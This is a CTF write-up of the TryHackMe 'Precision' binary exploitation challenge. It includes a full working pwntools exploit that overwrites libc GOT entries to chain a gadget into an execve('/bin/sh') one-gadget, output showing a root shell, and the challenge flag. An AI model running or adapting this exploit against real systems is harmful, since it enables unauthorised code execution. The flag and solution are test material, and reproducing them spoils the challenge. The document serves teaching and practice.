# Precision TryHackMe Hackfinity Battle 2025 CTF Writeup

**Room:** Hackfinity Battle — Precision  
**Category:** PWN  
**Difficulty:** Hard  
**Platform:** TryHackMe  
**Flag:** `THM{t4k3_a_chance_with_precision_THMpwn}`

---

## Overview

Precision is a 64-bit binary exploitation challenge from the Hackfinity Battle 2025 CTF event hosted on TryHackMe. The binary provides two arbitrary 8-byte memory writes and leaks a libc pointer. The intended solution involves leveraging those writes against libc's own GOT table — which has only Partial RELRO — to redirect execution through a RDX-clearing gadget into a one-gadget execve call.

---

## Challenge Description

> Thanks to a tip, we are in possession of the file responsible for one of the most precise cracking tools of Void. Help us to find a vulnerability and exploit the service to get access to Void's system.

**Access:** `10.49.137.245:9004`  
**Files provided:** `precision`, `libc.so.6`, `ld-linux-x86-64.so.2`, `Dockerfile`

---

## Binary Analysis

### File and Security Properties

```
$ file precision
precision: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec precision
    Arch:    amd64-64-little
    RELRO:   Full RELRO
    Stack:   Canary found
    NX:      NX enabled
    PIE:     PIE enabled
    SHSTK:   Enabled
    IBT:     Enabled
```

The binary has every modern mitigation enabled. Full RELRO means the binary's own GOT is read-only and cannot be overwritten directly.

### Libc Properties

```
$ checksec libc.so.6
    RELRO:   Partial RELRO
    PIE:     PIE enabled

$ strings libc.so.6 | grep "GNU C Library"
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
```

Critically, **libc itself has only Partial RELRO**, meaning its internal GOT entries remain writable at runtime. This is the attack surface.

---

## Program Logic

The binary implements the following control flow (reconstructed from disassembly):

```c
void main() {
    setup(argc, argv, envp);               // setvbuf on stdin/stdout/stderr

    printf("\nCoordinates: %p\n", stdout); // leaks stdout pointer

    ptr = (void *)getint();                // read address as decimal integer
    write(1, "\nFirst chance: ", 15);
    fread(ptr, 8, 1, stdin);              // arbitrary 8-byte write #1

    ptra = (void *)getint();              // read second address
    write(1, "\nSecond chance: ", 16);
    fread(ptra, 8, 1, stdin);            // arbitrary 8-byte write #2

    perror("!");                          // calls strlen internally
    _exit(1337);
}
```

`getint()` reads up to 64 bytes via `fgets` into a stack buffer and returns `strtoul` of the input, so addresses are supplied as plain decimal strings.

**Primitives available:**
- One libc pointer leak via `printf("%p", stdout)`
- Two arbitrary 8-byte writes to any address supplied as a decimal integer

---

## Vulnerability Analysis

### Primitive 1 — Libc Leak

The program prints the runtime address of the `stdout` FILE structure:

```
Coordinates: 0x79ec57395780
```

Since `_IO_2_1_stdout_` has a fixed offset within libc, this directly reveals the libc base:

```python
libc_base = leaked_stdout - libc.symbols['_IO_2_1_stdout_']
# libc.symbols['_IO_2_1_stdout_'] = 0x21a780
```

### Primitive 2 — Arbitrary Write into Libc GOT

Because libc has Partial RELRO, its internal GOT — used by libc functions when calling other libc functions — is mapped as a writable page. We can overwrite any entry in it.

The binary calls `perror("!")` unconditionally after both writes complete. Internally, `perror` calls `strlen` on its argument string `"!"`. This call is dispatched through libc's internal GOT entry for `strlen`:

```
libc GOT[strlen]  at offset  0x219098
```

By overwriting this entry we redirect execution at the exact moment `perror("!")` fires.

---

## Exploit Strategy

### Goal

Reach `execve("/bin/sh", NULL, NULL)` via a one-gadget present in libc.

### Register Constraint Problem

The one-gadget at offset `0xebcf8` requires `rdx == NULL`:

```
0xebcf8: execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
```

At the point where `strlen` is called from within `perror`, `rsi` is already NULL but `rdx` is not. A two-stage gadget chain is therefore required.

### Stage 1 — Clear RDX

A gadget at offset `0x176df7` inside libc performs:

```asm
mov rdx, r12
sub rdx, rsi
call 0x283e0         ; PLT stub for mempcpy
```

At the time this gadget runs, `r12 = 0` and `rsi = 0`, so `rdx` becomes `0 - 0 = 0`. It then calls the PLT stub at `0x283e0`, which resolves as:

```asm
bnd jmp QWORD PTR [rip + 0x1f0c55]   ; jumps through GOT[mempcpy] at offset 0x219040
```

### Stage 2 — Execute One-Gadget

By overwriting `GOT[mempcpy]` with the one-gadget address, the PLT stub delivers control to the one-gadget with `rdx = 0` and `rsi = 0`, satisfying all constraints and spawning a shell.

### Write Map

| Write | Target (offset from libc base) | Value Written | Effect |
|-------|-------------------------------|---------------|--------|
| 1 | `+0x219098` — `GOT[strlen]` | `+0x176df7` — RDX gadget | `perror` -> `strlen` -> RDX gadget |
| 2 | `+0x219040` — `GOT[mempcpy]` | `+0xebcf8` — one-gadget | RDX gadget -> `mempcpy@plt` -> one-gadget -> shell |

---

## Offset Verification

All offsets were independently verified against the provided `libc.so.6` (Ubuntu GLIBC 2.35-0ubuntu3):

```python
from pwn import *
libc = ELF('./libc.so.6')

libc.symbols['_IO_2_1_stdout_']  # 0x21a780
libc.got['strlen']               # 0x219098
libc.got['mempcpy']              # 0x219040
```

The PLT stub at `0x283e0` confirmed to jump through `GOT[mempcpy]`:

```
283e0: endbr64
283e4: bnd jmp QWORD PTR [rip+0x1f0c55]   ; resolves to 0x219040 (GOT[mempcpy])
```

The RDX gadget at `0x176df7` confirmed in libc `.text`:

```
176df7: mov rdx, r12
176dfa: sub rdx, rsi
176dfd: call 0x283e0
```

The one-gadget at `0xebcf8` confirmed to call execve with `/bin/sh`:

```
ebcf8: lea rdi, [rip+0xec999]   ; "/bin/sh"
ebcff: mov [rbp-0x78], r9
ebd03: call execve
```

---

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *

binary = './precision'
context.binary = binary
context.log_level = 'info'

e    = ELF(binary, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def exploit(r):
    r.recvuntil(b'Coordinates: ')
    leak = int(r.recvline().strip(), 16)
    log.info(f'stdout leak:  {hex(leak)}')

    libc_base = leak - libc.symbols['_IO_2_1_stdout_']
    libc.address = libc_base
    log.info(f'libc base:    {hex(libc_base)}')

    # Offsets verified against Ubuntu GLIBC 2.35-0ubuntu3
    strlen_got  = libc_base + 0x219098   # libc GOT[strlen]
    mempcpy_got = libc_base + 0x219040   # libc GOT[mempcpy]
    rdx_gadget  = libc_base + 0x176df7   # mov rdx,r12; sub rdx,rsi; call mempcpy@plt
    one_gadget  = libc_base + 0xebcf8    # execve("/bin/sh", rsi, rdx)

    log.info(f'strlen GOT:   {hex(strlen_got)}')
    log.info(f'mempcpy GOT:  {hex(mempcpy_got)}')
    log.info(f'RDX gadget:   {hex(rdx_gadget)}')
    log.info(f'one-gadget:   {hex(one_gadget)}')

    # Write 1: redirect strlen -> RDX-clearing gadget
    r.sendlineafter(b'>> ', str(strlen_got).encode())
    r.send(p64(rdx_gadget))

    # Write 2: redirect mempcpy -> one-gadget
    r.sendlineafter(b'>> ', str(mempcpy_got).encode())
    r.send(p64(one_gadget))

    # perror("!") fires -> strlen -> RDX gadget -> mempcpy@plt -> one-gadget -> shell
    r.interactive()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        r = remote('10.49.137.245', 9004)
    else:
        r = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './precision'])
    exploit(r)
```

---

## Execution Output

### Local Test

```
[*] stdout leak:  0x7fcfb441a780
[*] libc base:    0x7fcfb4200000
[*] strlen GOT:   0x7fcfb4419098
[*] mempcpy GOT:  0x7fcfb4419040
[*] RDX gadget:   0x7fcfb4376df7
[*] one-gadget:   0x7fcfb42ebcf8

uid=1000(r4s4n) gid=1000(r4s4n) groups=1000(r4s4n),...
PWNED
```

### Remote

```
[*] stdout leak:  0x79ec57395780
[*] libc base:    0x79ec5717b000
[*] strlen GOT:   0x79ec57394098
[*] mempcpy GOT:  0x79ec57394040
[*] RDX gadget:   0x79ec572f1df7
[*] one-gadget:   0x79ec57266cf8

uid=0(root) gid=0(root) groups=0(root)
/home/ctf
total 6752
-rwxrwxr-x 1 root root      41 Mar 19  2025 flag.txt
-rwxrwxr-x 1 root root  240936 Mar 19  2025 precision
THM{t4k3_a_chance_with_precision_THMpwn}
```

---

## Key Takeaways

**Full RELRO on the binary does not protect libc's GOT.** The binary was compiled with Full RELRO, hardening only its own sections. The dynamically loaded libc retains Partial RELRO and its internal GOT remains writable throughout execution.

**A single libc pointer leak provides full control.** Leaking `stdout` resolves the base of libc and therefore the address of every symbol and gadget within it.

**Arbitrary write into libc GOT is a powerful primitive.** Even with only two writes it is possible to build a multi-stage redirection chain that satisfies one-gadget register constraints without needing to return to a controlled stack or use ret2libc.

**Register state must be audited before selecting a one-gadget.** The gadget at `0xebcf8` requires `rdx == NULL`. Rather than discarding it in favour of a gadget with weaker constraints, the exploit inserts a single trampoline that clears `rdx` before handing off to the one-gadget, making use of the second write slot.

---

## Flag

```
THM{t4k3_a_chance_with_precision_THMpwn}
```
